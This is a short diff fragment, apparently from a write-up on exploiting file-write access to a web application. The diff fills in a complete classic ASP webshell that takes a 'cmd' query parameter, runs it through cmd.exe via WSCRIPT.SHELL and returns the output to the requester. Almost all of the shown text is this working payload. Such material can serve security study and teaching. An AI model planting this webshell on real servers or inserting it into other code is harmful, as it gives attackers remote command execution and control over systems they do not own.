@@ -8,7 +8,10 @@ In this exploit we take the assumption that we have file write into a web-app an
 
 We can achieve a simple webshell with the follow classic ASP code:
 
-```text
-set cmd = 
+```asp
+set cmd = Request.QueryString("cmd")
+Set os = Server.CreateObject("WSCRIPT.SHELL")
+output = os.exec("cmd.exe /c " + cmd).stdout.readall
+response.write output
 ```
 
